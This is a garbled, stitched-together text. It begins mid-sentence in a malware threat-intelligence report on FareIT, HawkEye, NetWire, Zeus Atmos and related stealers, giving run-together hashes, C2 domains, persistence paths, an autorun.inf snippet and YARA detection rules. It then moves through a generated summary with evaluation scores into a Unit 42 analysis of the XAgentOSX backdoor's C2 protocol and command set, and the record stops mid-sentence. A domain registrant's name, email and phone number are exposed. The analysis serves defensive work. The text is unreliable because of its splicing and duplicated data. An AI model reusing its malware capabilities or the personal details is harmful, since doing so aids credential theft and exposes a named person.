phone book for Remote Access ConnectionISR Stealer makes GET requests to upload data to a remote C&C server:GET request to upload dataNetWire RATThis malicious application has the following functionality:File manager (allows a remote user to search, download, install, copy and remove files)KeyloggerScreen captureRemote shellReverse ProxyProxifierCollects general system informationObtains processes and services list, disables active processesSteals credentials from the following applicationsMozilla Firefox Internet Explorer Opera Chromium SeaMonkey Windows Live Messenger Pidgin Mozilla ThunderBird Microsoft OutlookNetWire RAT uses its custom protocol for CnC communication:Request to a remote C&C serverZeus AtmosThis is a variant of the Zeus banking malware or a variant of Cidatel. It performs the following operations:Injects code into web applications and web pagesPerforms web filtering for predefined websites: URL logging, capturing screenshots, recording videoDNS redirectDNS redirect Form grabbers (extracts data from POST requests)KeyloggingLoads and executes files by requestExecutes requested list of system commands after the Trojan launches. Sends data to remote C&C serverSearches files by parametersNetwork scan for given URL or subnet maskSteals cookies, deleteds cookiesSteals security certificatesCollects list of installed applicationsChanges web browser start pageDisables operating system by erasing file system, with subsequent system rebootBackconnect server. Creates a proxy server in the victim network to redirect requests other infected IPs from internal subnets to external network resources behind the NAT.VNC Remote DisplayRemote command lineRequest to a remote C&C serverIndicators of CompromiseFareIT/Pony 2.0Md5b26502694ec0f977510045e4805e3c5c312feecdc77cb3e29151734ec9939cfb23965eaaece7160f5f4f38a2b2ae557a36db408c729e4eec4b67593dbe6e21cb94083460473c6ccf96060c3f35bda8f04e06d7730397f84761222ceb22578e59fff1ccdebd953a89168fa545cca2d78a5497251394bca97e1cbe2008740ead6aead4bbedddba4cd1d0b31a82987ffce4d04c3b2fe025c183ffcf85d334b2dfc3f402e0747de2f70a43dcb0ef5cb1bb12262c692bec80d7d7af77026d03a9277dd0c3b85e2459e85fd0d00b5ac88782d10899d80a6e4168e760321009d28b4a257ba5b2b942587afad892d14c29186881f328c9cef3df7dbbafdabe102f2dd489513d4413be0c6756b0aec628fb8f5398a1709a3f4952c2928e5f7e4ba552bef6a598c6964f7f9aef6e6ad21c630e744abcd6efb7ba13404999640cbf4a8300ef7210fa489bfb83715529f1ec3b55922b2cab3363d8bb5601948f528add75c5e2abaaba5109c19f658f9eaf56551c099653b9d168f0776c99518a8a125459b94c1c000371cda75156c5af004ca4b08e085c78e6d84ef59b06e918c55d9fd8de8c1e692a3e7f16b8bc9949eba72158a773e9d3d83bec1d897538af8aebffd03ad1c5674b866e3362bc09dfab0385b44becdfae40a4e4a1b60322fd180f8cfa1c330b7f872d098ef8f1dd0e52f6d5c5a92ee2ab25321e1bb1d56d8bca11fe0cc76496f1794733e30fb2df9e5e894f4e1cfd63b1d969270cccd998279477a687407c9e7318168e76fdd5414fe00d8daaf21e57da8a2813c9b1cb6598609e10faf1b4d1212291e44846ff608711c0f9e07b3e01712e2261fa051e46c489df533d7bdcd1d8c46271abfe4ea230214567ae6d616dd0b2770a7d7bcdecc5f6eebbde4d7c51966a70638915dbd7be9f15592cb4534258a22f09d39f5201f9deae0abec68009fcb032b5330ca04cfc536dda6d894820cbe25bcabdf6557888d5c3353098a7f354693b8f497e4e3599517fdffed0a7b96d148f8ef2b2f3ef825342bf0eb651652e2222f3523296020ae0adaa3920364ea4af607d7ec044bd7e94cf81f2d7314231e1ddf6cd6edc269b65221e983a2a51a5f21d781c8ab2b081ca3d044bb548ba4dcb0af37929c7f85d0830e4fb7682b0a68240b82a8d4ff46a9bb4833c243a690090c7b2b1808ea5586dd3394951b0ad2e9747132bf556945785f06610dcc8f1e7507e85804477b46041c4f79a63187e5c5279a6b25fc25e822277a0e67893bced2a9404e662d11e74eb92fe91cff7e5c4cc287ada4d8f190f7d821fbd55a64be18082a65cbdb37dc3f76c72ec50bffaecf9cfff312dfff977602a696905bc139ac7a3ea98a743ab53e5dc9a143d14c0632e26efc3b4bdbe8cc4e35cbf2ca257beddcde4930bff12554c70ac0d486ecec324588b4f4f1be7ca72a77a27bcc84a0f4d8d1730e7cfb28ab9ab1dd0c4581d562105d2b9bbee31b464e11add3314d68e6aa2e3b43db1e932212628d158d025d70b4551fb7ab195fe4a20dad19f6d060aba7b0dfe98f344a08525794f3a393f11280bd0e9992d38f5c474d2031059950675e2eae333debef01953a5e1ef8f51b4f43117385d03872644af00393f999d3ef8695eedf3759bf930134198b2d79b949ec2e377c101fb6607b7f0f46c6921a3ff76584d0877a7d3d67e22700d8495ff84fc026d94eb29c5766d3f412cb50431fb071b43075967d95dca4e4b74a4a53b46d9cdfbe2dcf620852c6ff9e62c81afa5b79a5e44ad1a5f993e56ea0f19c31f027c91a17e696d3badb647b4776e48c196ab809cf170027a36f8ce83b2a0b3bf838e056efad6c4e2fc34ff907b1ffa460248d72f9c927fbde7e49b3f9064dc746f578444fd08b899acab6a9f9480a99a74ac5eccdf92a3d15226ff7644373f7c440d5ae431e2d638037b1522d5376d5bb65986d89c860434a131cd07af3c5834cfa707d899a6ded4df35fe454663b6ab6bd1952c68e8378e9e88f1d02844f7e80eef3e16b5902839213542f2433da276bbbf4ea6628ee8ac6694aa23b70a27ede7277a5c482d156bf8cad3d67ecf7639651850c1f2a333f017a2b7a58c2e9ab8bd9a64bb4ab9b921958af213209cdf1ff7cc193e6daabdb54e44d7d376c111b949dafc35aaab4595ed5d5119731f842f279d81f52a3d21d43367b976eb24a0c5cc06f6e5e9fb6da7529a02331972fe5bf21593ddaf4aae3ac77f1bff02c6bc4d634d6b5d40a4be72de9b91b9d2d36d021db429a696e5ab237b30a743cec3739d8fb283e2a7a6015f1be1391c33a2cd770d2079332bfffac2b257d5ca88a40eb12f0c3aa4ec1db178fbbe69a329cf10bd1bcf24e12761df2ac8574cd5421e12c02277ede45fdad0cb6e5572555a6413aa570ab9772d1e03e054eb4d5ec8952a38488d890751f2e7b1a8dc7c212a547fb0c05045f84aa9bb2e27ee490379c98b573ec48dea7caffcd18eea04d73c6da5bc70e11f4dd1858ab8bbcee699c39bda6794432858b2bfa8e7e252af5d59d8ea87cce7ba48805a0082c59c8feab8940124976c3608a484d929a7bd0d6be7a005ec671309abebc5e183ccfe98a4cc6e072f11f8bb4d295d1000148939e99577CnCalreyadbplastics.comxpweb.winheinevy.comoverseas-operation.commetaksen.comcharlogistics.combtinterment.comkinqnuts-raaphorst.comwatersysterns.comhidroquil-ar.comthai-nidhi.comms45-hinet.netfullone2u.compoolkingsthailand.comsoaaxa.bizrestarz.bizgalaxystarshop.comasappyco.bizgettoworkzz.bizyasive.bizalu-heat.biz66.23.226.40sinctruk.compguy.faithchunfenqlighting.comhunterkaysmoves.indanqote.combiblesoceities.orgsympetax.comlumibrigth.combothela-orsaro.comMost of the domains are registered in Nigeria using the same personal data:Name Islam Organization Mhmed Email isammahqoub1@gmail.com Address No. 1401, 1173, Huang Cun City Zhong Li, State Lagos Country Nigeria Phone +234.8136858033 Fax +234.8136858033 Private noFile System%APPDATA%[A-F0-9]{6}[A-F0-9]{6}.exe%APPDATA%[A-F0-9]{6}[A-F0-9]{6}.hdb%APPDATA%[A-F0-9]{6}[A-F0-9]{6}.lck%HOMEPATH%DocumentsTicoapp.exe%HOMEPATH%DocumentsEscoapp.exe%HOMEPATH%DocumentsDulfapp.exe%HOMEPATH%DocumentsEcheapp.exe%HOMEPATH%DocumentsNew text document.txtRegistryRegistry name Key name Value HKEY_CURRENT_USER SoftwareMicrosoftWindowsCurrentVersionRun Application Path to malicious filesLuminosity RATMd51f9ea55ec924bf927db4fb4f429d49b6f758f8cd8df5c969181f727bdc300b0909b3e90ba0352189c374ed9f925fd0164e6b187f08037c03887fc0cc7d2d7862890ce994b735b36bbbb737d4ea86283c8badfb1cfda4d0b88fa8e765b6162eaa95cc32e268174eb70e5d4878c8c481f8cc6fa7ea140f2af9e821f0b2a3785f3bCnCwww.creativeforwardings.cfshadowwalkersonline.co.ukwww.ballerpushers.cfremote.legacyrealestateadvisors.netalibabadns.legacyrealestateadvisors.netFile System%HOMEPATH%DocumentsYiTapp.exe%HOMEPATH%DocumentsYaPapp.exe%HOMEPATH%DocumentsNativeapp.exe%HOMEPATH%DocumentsNosapp.exe%HOMEPATH%DocumentsMonorapp.exe%HOMEPATH%DocumentsWinLuapp.exe%HOMEPATH%DocumentsNew text document.txt%ProgramFiles%Clientclient.exeRegistryRegistry name Key name Value HKEY_CURRENT_USER SoftwareMicrosoftWindowsCurrentVersionRun Application Path to malicious filesHawkEye Keylogger/StealerMd559d528ac5530c7dd148fc85ac3e2de5b80c4a3d66159877e264b0eab74a791db94c4d42987540d6428a79c1ec4498a62c96ac3ecac9e7f5c72aa452a299ccd4cca261b901e94148a336b7504612900b35232002e147c9a71de02b1503549ee5d8f35879eedef813f7cf363e6b31bb720983ac1b9d8d8f93f6ec2133873e0d765aa6eb70eb3760839617114e970eec9adcc2a4547e94971b25f5c64db863c7007Malware FTP serversftp.***.mkMalware emailsPointcompltd****@gmail.comFile System%APPDATA%pid.txt%APPDATA%pidloc.txt%AppData%WindowsUpdate.exe%HOMEPATH%DocumentsNew text document.txt%HOMEPATH%DocumentsRunesapp.exe%HOMEPATH%DocumentsCoinapp.exe%HOMEPATH%DocumentsTrumpapp.exe%HOMEPATH%Documentsdoc_23772.exe%TEMP%holderwb.txt%TEMP%vbc.exe%TEMP%holdermail.txt%TEMP%SysInfo.txt%FLASH-DRIVE%Sys.exe%FLASH-DRIVE%autorun.infif the file contains the following:[autorun]open=Sys.exeaction=Run win32RegistryRegistry key location Key name Value HKEY_CURRENT_USER SoftwareMicrosoftWindowsCurrentVersionRun WindowsUpdate Path to malicious file HKEY_CURRENT_USER SoftwareMicrosoftWindowsCurrentVersionRun Application Path to malicious fileISR StealerMd542de8eeb42766ab89f7ad30e3a95a6dcda0bc308da0fdd2bc88c16609de84799e8bfa64826d095ff3699a5e3df205d24bd32f579daf66fc77d0d39faa0827d49baf19d9baa948caa29fa4d47a5b00f39CnChardworkzone.cfivicker.usa.cclimco.usa.cccs19335.tmweb.rumirchifunz.inFile System%HOMEPATH%Desktopfilename.exeRegistryRegistry key location Key name Value HKEY_CURRENT_USER SoftwareMicrosoftWindowsCurrentVersionRun Update Path to malicious file HKEY_LOCAL_MACHINE SoftwareMicrosoftWindowsCurrentVersionRun Update Path to malicious fileNetWire RATMd5362b8ff281b373698823f01ec5de316eb4161aeec2eee9f16b4f7bf53017b593CnC178.175.138.196gavingo2135235.ddns.netwww.spmersclub.cfFile system%HOMEPATH%DocumentsChunapp.exe%APPDATA%InstallHost.exe%APPDATA%Install.Identifier%APPDATA%Logs%Date%RegistryRegistry key location Key name Value HKEY_CURRENT_USER SoftwareMicrosoftWindowsCurrentVersionRun Application Path to malicious file HKEY_LOCAL_MACHINE SoftwareMicrosoftWindowsCurrentVersionRun NetWire Path to malicious fileZeus AtmosMd553b9d168f0776c99518a8a125459b94c6ed4cb68167e3413d9987b0f40733ded763eff9455c998456f017d375ebbe334acb19c9d138687d8b77b9a16318f78970828d80567c200832804ab58b9653f401c55c4e93c5b59c5497817c2d75eeb8220bca6c0ce7aa1c1eec53bde21162f0541875543ce8f9fc1c3c823e783fc379959ea190027969a9395556a1879b8fa1c926a5b3a83da4947dc45b83a564e5de4cb6b3071cf743fa0e62af0e29a269301f7f79d8821abd3035a3c77b4d13193341d562105d2b9bbee31b464e11add33144a0f4d8d1730e7cfb28ab9ab1dd0c458File System%APPDATA%[A-Z][a-z]+[a-z].exe%APPDATA%[A-Z][a-z]+[a-z].otdCnCthai-nidhi.comasappyco.bizhungasidy.biz186.202.127.132RTF Files md503b9be3613b0ec3c0010dd84ea0da5af04db3af06e3b091b9b681e083b168dfc08f0afe19acb14a958c1b8c76f4707000d37476b6d1092c272080db2bbbf0acc0fd4b949e246648c1d055f01bb4bf9f71460885d4044f2a482ddf88a04e0d73720a8590c440142a748e48b4ed90e230226c6cec2ae697064818f477bba1c30e72d42e73957748fbc9477137f1ef15ae92de848b32f4dff5f5b7f2e6fe1516dca3825cf1c10ad5dacc1f7944c78316f7f3a72e7e3c4f694f9a42c23a8e8bebf2b40ab4fd575562722678e305a7241628c450077349418642f4deb1c340d59200b457db0e38bdb36d2bb32a83d2b67b0374aa2551daab5b62ac45ce3cd5a03f0394df15a40cd7555e3910a2a43aafd0eb55bd9ebfd3fd707881ca8c8d22ba2cdf860c9a1f68430480af83d0e017aaf48cd6296105442512e2a51539496625dfa0e638bc97f9fd69a5c9cb9e229fd6ed1ba66e7cdf10171bf077494af0cf01b52c267a91ed5743f122c31a5bf7b51eb7a97684d641e4283e8bc55554276120652d16d43c1beb7a6ec2e6cd5f31110e20bcc6e8da6c655ccf08776f2014342f6acf76eb48cfbd1232521bfd3e1d6a39eb097702091d4811e300c1ca78336b7ab43af71aa497faae2a905d4bdf4e1235e0838734971fa3e313775b15f0da104eacffd75b57d75017cf55f8b424d268770a0c77a2882f80fad453e811dfb509453f551819666db00047669449f329ba5b7067487817d61320cd6f82087d3502291731e87bd523f6224525c2f49f4f822c5db988e0efa6989805207da2f6bce0a5daa038ebb040181cc45d01fa820c383dee5ec95eab9b9ff60e9fe4b3749e262a826379b1892e64e58cf459c546b908da0b34d9d5c4fc4b7709d905a7122a2554a92a09ef35c8a2e60c107d898d1b7be513946a19b946c00a1daebcc14701daafacdf6a5699065d36c3b72b8f1eef6563acc97a6ea151d4f6248ebfcfd5fca757fa6eeae2c477e363887351f9bbb27a6033317afe2276dd4bc068210813e9846eeb046b9337eea8244820138f3fa3fa5648c60b9435889a28f1899d2a57074dcd0d9c9bd9e61c85f6564776c0a4091e497d6b7c10323a600fa3ea6941f5c4cd8d34380c638feea533a837092935b9b26a32e0dcf46172bdc392944c081e6173220b09dd0f4e5a47fed802786e2c0260205ca07d70e34afd9e06ea0f7d1861e6c0abf35d777f82758cfc69eb50925200347a09be07ca37b2117a4c0f6db2eca60162536e221bfc633c5782212e83d1c5d130b28e842b437dded064631aaf91b8d8c85f2ea2849c7622450b373841a95b0288d7feb72033a6fabe7f400b5fd32b51f07bdef242b3a7b0ca00fc3a565070884c4d2efd09ae35810097823a79193457fbfb7f0a4e659f641188fde6f727dbb618c10f465c8ddeb47520de96469af0ee12d36f734f0b9a246e9c37edf728b680b5c3cff49dd00787aef54347e98833cca9601b26502694ec0f977510045e4805e3c5c312feecdc77cb3e29151734ec9939cfb23965eaaece7160f5f4f38a2b2ae557a36db408c729e4eec4b67593dbe6e21cb94083460473c6ccf96060c3f35bda8f04e06d7730397f84761222ceb22578e59fff1ccdebd953a89168fa545cca2d78a5497251394bca97e1cbe2008740ead6aead4bbedddba4cd1d0b31a82987ffce4d04c3b2fe025c183ffcf85d334b2dfc3f402e0747de2f70a43dcb0ef5cb1bb12262c692bec80d7d7af77026d03a9277dd0c3b85e2459e85fd0d00b5ac88782d10899d80a6e4168e760321009d28b4a257ba5b2b942587afad892d14c29186881f328c9cef3df7dbbafdabe102f2dd489513d4413be0c6756b0aec628fb8f5398a1709a3f4952c2928e5f7e4ba552bef6a598c6964f7f9aef6e6ad21c630e744abcd6efb7ba13404999640cbf4a8300ef7210fa489bfb83715529f1ec3b55922b2cab3363d8bb5601948f528add75c5e2abaaba5109c19f658f9eaf56551c099653b9d168f0776c99518a8a125459b94c1c000371cda75156c5af004ca4b08e085c78e6d84ef59b06e918c55d9fd8de8c1e692a3e7f16b8bc9949eba72158a773e9d3d83bec1d897538af8aebffd03ad1c5674b866e3362bc09dfab0385b44becdfae40a4e4a1b60322fd180f8cfa1c330b7f872d098ef8f1dd0e52f6d5c5a92ee2ab25321e1bb1d56d8bca11fe0cc76496f1794733e30fb2df9e5e894f4e1cfd63b1d969270cccd998279477a687407c9e7318168e76fdd5414fe00d8daaf21e57da8a2813c9b1cb6598609e10faf1b4d1212291e44846ff608711c0f9e07b3e01712e2261fa051e46c489df533d7bdcd1d8c46271abfe4ea230214567ae6d616dd0b2770a7d7bcdecc5f6eebbde4d7c51966a70638915dbd7be9f15592cb4534258a22f09d39f5201f9deae0abec68009fcb032b5330ca04cfc536dda6d894820cbe25bcabdf6557888d5c3353098a7f354693b8f497e4e3599517fdffed0a7b96d148f8ef2b2f3ef825342bf0eb651652e2222f3523296020ae0adaa3920364ea4af607d7ec044bd7e94cf81f2d7314231e1ddf6cd6edc269b65221e983a2a51a5f21d781c8ab2b081ca3d044bb548ba4dcb0af37929c7f85d0830e4fb7682b0a68240b82a8d4ff46a9bb4833c243a690090c7b2b1808ea5586dd3394951b0ad2e9747132bf556945785f06610dcc8f1e7507e85804477b46041c4f79a63187e5c5279a6b25fc25e822277a0e67893bced2a9404e662d11e74eb92fe91cff7e5c4cc287ada4d8f190f7d821fbd55a64be18082a65cbdb37dc3f76c72ec50bffaecf9cfff312dfff977602a696905bc139ac7a3ea98a743ab53e5dc9a143d14c0632e26efc3b4bdbe8cc4e35cbf2ca257beddcde4930bff12554c70ac0d486ecec324588b4f4f1be7ca72a77a27bcc84a0f4d8d1730e7cfb28ab9ab1dd0c4581d562105d2b9bbee31b464e11add3314d68e6aa2e3b43db1e932212628d158d025d70b4551fb7ab195fe4a20dad19f6d060aba7b0dfe98f344a08525794f3a393f11280bd0e9992d38f5c474d2031059950675e2eae333debef01953a5e1ef8f51b4f43117385d03872644af00393f999d3ef8695eedf3759bf930134198b2d79b949ec2e377c101fb6607b7f0f46c6921a3ff76584d0877a7d3d67e22700d8495ff84fc026d94eb29c5766d3f412cb50431fb071b43075967d95dca4e4b74a4a53b46d9cdfbe2dcf620852c6ff9e62c81afa5b79a5e44ad1a5f993e56ea0f19c31f027c91a17e696d3badb647b4776e48c196ab809cf170027a36f8ce83b2a0b3bf838e056efad6c4e2fc34ff907b1ffa460248d72f9c927fbde7e49b3f9064dc746f578444fd08b899acab6a9f9480a99a74ac5eccdf92a3d15226ff7644373f7c440d5ae431e2d638037b1522d5376d5bb65986d89c860434a131cd07af3c5834cfa707d899a6ded4df35fe454663b6ab6bd1952c68e8378e9e88f1d02844f7e80eef3e16b5902839213542f2433da276bbbf4ea6628ee8ac6694aa23b70a27ede7277a5c482d156bf8cad3d67ecf7639651850c1f2a333f017a2b7a58c2e9ab8bd9a64bb4ab9b921958af213209cdf1ff7cc193e6daabdb54e44d7d376c111b949dafc35aaab4595ed5d5119731f842f279d81f52a3d21d43367b976eb24a0c5cc06f6e5e9fb6da7529a02331972fe5bf21593ddaf4aae3ac77f1bff02c6bc4d634d6b5d40a4be72de9b91b9d2d36d021db429a696e5ab237b30a743cec3739d8fb283e2a7a6015f1be1391c33a2cd770d2079332bfffac2b257d5ca88a40eb12f0c3aa4ec1db178fbbe69a329cf10bd1bcf24e12761df2ac8574cd5421e12c02277ede45fdad0cb6e5572555a6413aa570ab9772d1e03e054eb4d5ec8952a38488d890751f2e7b1a8dc7c212a547fb0c05045f84aa9bb2e27ee490379c98b573ec48dea7caffcd18eea04d73c6da5bc70e11f4dd1858ab8bbcee699c39bda6794432858b2bfa8e7e252af5d59d8ea87cce7ba48805a0082c59c8feab8940124976c3608a484d929a7bd0d6be7a005ec671309abebc5e183ccfe98a4cc6e072f11f8bb4d295d1000148939e99577RTF Drop filenames%HOMEPATH%Desktopfilename.exe%HOMEPATH%Desktopsystem.exe%LocalTEMP%filename.exe%LocalTEMP %system.exeYARA rulesrule VBPacker_FareIT_Zbot{meta:copyright = ""Kaspersky Lab""description = ""Rule to detect VB Packer of FareIT and Zbot samples""hash1 = ""0b7f872d098ef8f1dd0e52f6d5c5a92e""hash2 = ""0eb12f0c3aa4ec1db178fbbe69a329cf""version = ""1.1""strings:$a1 = ""C:\Program Files (x86)\Microsoft Visual Studio\VB98\VB6.OLB""//""gdi32"" + 0x11 +""SetViewportOrgEx""$a2 = {67 64 69 33 32 00 00 00 11 00 00 00 53 65 74 56 69 65 77 70 6F 72 74 4F 72 67 45 78}//OriginalFilename AX.exe$b1 = {4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 41 00 58 00 2E 00 65 00 78 00 65 00}//OriginalFilename AS.exe$b2 = {4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 41 00 53 00 2E 00 65 00 78 00 65 00}//OriginalFilename Can.exe$b3 = {4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 43 00 61 00 6E 00 2E 00 65 00 78 00 65 00}//OriginalFilename usisui.exe$b5 = {4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 75 00 73 00 69 00 73 00 75 00 69 00 2E 00 65 00 78 00 65 00}condition:uint16(0) == 0x5A4Dand (all of ($a*))and (any of ($b*))//and (any of ($c*))and filesize > 250000}rule MSILPacker_ FareIT_ISR Stealer_Luminosity_HawkEye{meta:copyright = ""Kaspersky Lab""description = ""Rule to detect MSIL Packer of FareIT, ISR Stealer, Luminosity, HawkEye Keylogger samples""hash1 = ""1f9ea55ec924bf927db4fb4f429d49b6""hash2 = ""80c4a3d66159877e264b0eab74a791db""hash2 = ""e8bfa64826d095ff3699a5e3df205d24""version = ""1.1""strings:$a1 = ""set_Key""$a2 = ""set_IV""$a3 = ""set_ClientSize""$a4 = ""set_ControlBox""$a5 = ""SetCompatibleTextRenderingDefault""$a6 = ""CompilationRelaxationsAttribute""$a7 = ""ICryptoTransform""$a8 = ""_CorExeMain""$b1 = ""Video card management""$b2 = ""Net Extensible Autheticator""$b3 = ""NetTcpActivator""$b4 = ""nVidia PhysX technology""$b5 = ""WdiSytemHost""";The ITSecurity report outlines a variety of malicious activities, including stealing data from the clipboard, making screenshots, cleaning up Mozilla Firefox and Internet Explorer cache, navigating to predefined web resources, using an encrypted SSL channel to communicate to a remote C&C server, activating keylogging functionality to intercept the key strokes, copying selected files to %Temp% and executing them, downloading selected files from the Internet to %Temp% and executing them, stealing authentication data from saved Minecraft and RuneScape games, stealing saved data from a Bitcoin vault, and infecting portable media. The ISR Stealer malicious tool is written in VB and can use the legitimate applications Nirsoft Mail Password Recovery and Nirsoft Web Browser Pass View to steal authenticated data from the following applications: Mozilla ThunderBird, Microsoft Outlook, Eudora Mail, Outlook Express, IncrediMail, Google Desktop, Windows Mail, Windows Live Mail, Windows Live Messenger, Group Mail, KeePass, Internet Explorer, Opera, Pidgin, phone book for Remote Access Connection, ISR Stealer makes GET requests to upload data to a remote C&C server. It performs the following operations: Injects code into web applications and web pages, Performs web filtering for predefined websites: URL logging, capturing screenshots, recording video, DNS redirect, Form grabbers (extracts data from POST requests), Keylogging, Loads and executes files by request, Executes requested list of system commands after the Trojan launches. Sends data to remote C&C server, Searches files by parameters, Network scan for given URL or subnet mask, Steals cookies, deleteds cookies, Steals security certificates, Changes web browser start page, Disables operating system by erasing file system, with subsequent;en;{'r': 0.11568627450980393, 'p': 0.6781609195402298, 'f': 0.19765493888369826};{'r': 0.08115015974440895, 'p': 0.5427350427350427, 'f': 0.14118954748679166};{'r': 0.11568627450980393, 'p': 0.6781609195402298, 'f': 0.19765493888369826}
https://unit42.paloaltonetworks.com/unit42-xagentosx-sofacys-xagent-macos-tool/;XAgentOSX: Sofacy’s XAgent macOS Tool;"This post is also available in: ??? (Japanese)During our continued research on Sofacy's Komplex Trojan, we have found a sample of a backdoor Trojan that we believe the Sofacy group uses when targeting individuals running macOS systems. The backdoor Trojan authors have called it XAgentOSX, which shares the name XAgent with one of Sofacy's Windows-based Trojan and references Apple's previous name for macOS, OS X. It appears the same actor developed both the Komplex and XAgentOSX tools, based on similarities within the following project paths found within the tools:Komplex: /Users/kazak/Desktop/Project/komplexXAgent OSX: /Users/kazak/Desktop/Project/XAgentOSXWe believe it is possible that Sofacy uses Komplex to download and install the XAgentOSX tool to use its expanded command set on the compromised system.XAgent C2 CommunicationsThe macOS variant of XAgent has ability to receive commands from threat actors via its command and control channel, but is also capable of logging key strokes via its keylogger functionality. XAgent uses HTTP requests to communicate with its C2 servers, which allows the threat actor to interact with the compromised system. The Trojan uses HTTP POST requests, as seen in Figure 1 to send data to the C2 server, and GET requests to receive commands from the server, as seen in Figure 2. We are still analyzing this Trojan to determine the specific structure of the data sent between the Trojan and the C2 server, however, it does appear that the Trojan is using the RC4 algorithm to encrypt data sent to the C2 server within HTTP POST requests.Figure 1 XAgent macOS HTTP POST requestFigure 2 XAgent mscOS HTTP GET requestThe C2 URLs generated by XAgentOSX are very similar to those created by its Windows-based counterpart. When generating the URL for the HTTP requests issued to the C2 server, the Trojan chooses a random folder from the following to include within the URL path:watch/?search/?find/?results/?open/?search/?close/?XAgent also will choose several parameters names from the following list when finishing the construction of the C2 URL:itwm=text=from=.itwm=ags=oe=aq=btnG=oprnd=itwm=utm=channel=The XAgent OSX Trojan generates a system specific value that it refers to as an ""agent_id"", which is a unique identifier for each compromised host. The value is derived using the IOService to access the IOPlatformUUID property, which is equivalent to the ""Hardware UUID"" listed in the system information application, as seen in the Figure 3 screenshot of our analysis system. The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was ""0000"".Figure 3 Hardware ID used by XAgent to uniquely identify compromised hostsWhen generating the URLs within the HTTP POST and GET requests, XAgent sets one HTTP parameter using a specific data structure that contains this agent_id value. This parameter transmits the agent_id to the C2 server to obtain commands the actor wishes to execute on the compromised system. The data structure used to transmit the agent_id to the C2 is as follows:struct {DWORD random_value_for_key,CHAR[7] constant_value,DWORD agent_id,}The constant value in the data structure is a 7 byte string that is hardcoded to ""\x56\x0E\x9F\xF0\xEB\x98\x43"", followed by the agent_id value (""0000"" in our case). The first DWORD in the data is a random value that the Trojan will use as an XOR key to encrypt the constant value and the agent_id. For instance, the following 15 bytes were used to generate an HTTP parameter during our analysis:Random Value Constant Value agent_id 0F EE C8 83 56 0E 9F F0 EB 98 43 30 30 30 30The resulting ciphertext is then encoded using XAgent's base64 encoding routine that starts by building the following encoding alphabet:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_As you can see, this is not the standard base64 alphabet, rather it is the ""URL and Filename safe"" Base 64 Alphabet from RFC 4648, as the ""+"" in the standard alphabet is replaced with ""-"" and the ""/"" replaced with ""_"". It then uses the base64 encoding function with this alphabet to encode the data, which in the above case resulted in:D-7Ig1ngV3PkdouzP974The Trojan then creates a string of 9 random symbols and appends the encoded ciphertext to this random string. For example, the following string would be included in one of the HTTP parameters sent to the C2 server:eRmaVsr90D-7Ig1ngV3PkdouzP974In this specific case, the actor made a mistake when configuring this XAgent sample with its C2 locations. The sample creates an array that contains the following strings for the Trojan to use as C2 locations:http://23.227.196[.]215/http://apple-iclods[.]org/http://apple-checker[.]org/http://apple-uptoday[.]org/http://apple-search[.]infoNotice the last one is missing the trailing ""/"", which causes an issue when the Trojan attempts to use this string to build the remainder of the C2 URL, as the Trojan will append the next string in the URL directly to this string. For instance, when using this string we observed DNS queries for ""apple-search.infoclose"", as the string ""close"" was supposed to be the next portion of the C2 URL.Available CommandsThe XAgent C2 server will provide commands for the Trojan to run on the compromised system within its response to inbound HTTP request. The XAgentOSX Trojan includes responses to commands within HTML tags, which we believe allows the C2 server to format logs for viewing.In most cases, the responses sent to the C2 server are included between the ""<font size=4 color=000066><pre>"" and ""</pre></font>"" HTML tags. We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1. The command handler obtains a command identifier from the C2 server and adds 0xFFFFFF9B to this value and then uses a switch statement to determine the appropriate command to execute. The switch statement checks for 19 cases, between 101 and 119. (Updated to correct command IDs, thanks @mykill!)Command ID Function Description 101 getInfoOSX Gathers username and OSX version and responds using the encrypted form of the following string: ""Mac OS X - [OSX version] x64<br>User name - [username]"" 102 getProcessList Runs ""ps aux"" to obtain a list of running processes 103 remoteShell Runs supplied command using ""/bin/sh"" 104 getInstalledAPP Gets a list of installed applications by running the command ""ls -la /Applications"" 105 showBackupIosFolder Checks to see if an IOS device was backed up to the system by running the command ""ls -la ~/Library/Application\ Support/MobileSync/Backup/"" 106 downloadFileFromPath Uploads a file from a specified path 107 createFileInSystem Downloads a file, specifically provided within the C2 server's HTTP response 108 execFile Executes a specified file on the system using the NSTask:launch method 109 deletFileFromPath Deletes a specified file using the NSFileManager:removeFileAtPath method 110 takeScreenShot Takes a screenshot using the CGGetActiveDisplayList, CGDisplayCreateImage, NSImage:initWithCGImage methods. Returns the screenshot to the C2 via: <img src='data:image/jpeg,base64,[base64 of screenshot]' width=800 height=500 /><br> 111 startTakeScreenShot Creates a thread to take a screenshot at a set interval (default: every 10 seconds). Uses the same method in ""takeScreenShot"" function 112 stopTakeScreenShot Closes the thread created in the ""startTakeScreenShot"" function 116 getFirefoxPassword Looks for folders with ""/Firefox/Profiles"" in the path and reads the contents of the ""logins.json"" file for ""hostname"", ""encryptedUsername"" and ""encryptedPassword"" entries. It also attempts to issue the following SQL query on the ""signons.sqlite"" file: ""SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?"" 117 ftpUpload Uses FTPManager:uploadFile method and a supplied server name, username and password. 118 ftpStop Calls ""stopOperation"" method, but does not appear to stop FTP uploads. 119 readFiles Obtains file information on a file or a folder, and supports a ""*"" wildcard and recursive file list. The code will gather the information and format the list using the following HTML to create a table: <table><tr><td>Type</td><td>Owner</td><td>Permissions</td><td>Created</td><td>Modificated</td><td>Size</td><td>Path</td></tr><tr><td>[fileType]</td><td>[fileOwnerAccountName]</td><td>[number filePosixPermissions]</td><td>[fileCreationDate]</td><td>[fileModificationDate]</td><td>[fileSize]</td><td>[file path?]</td></tr>...</table>Table 1 Commands available within XAgent OSXThe 'showBackupIosFolder' command is rather interesting, as it allows the threat actors to determine if a compromised system was used to backup an IOS device, such as an iPhone or 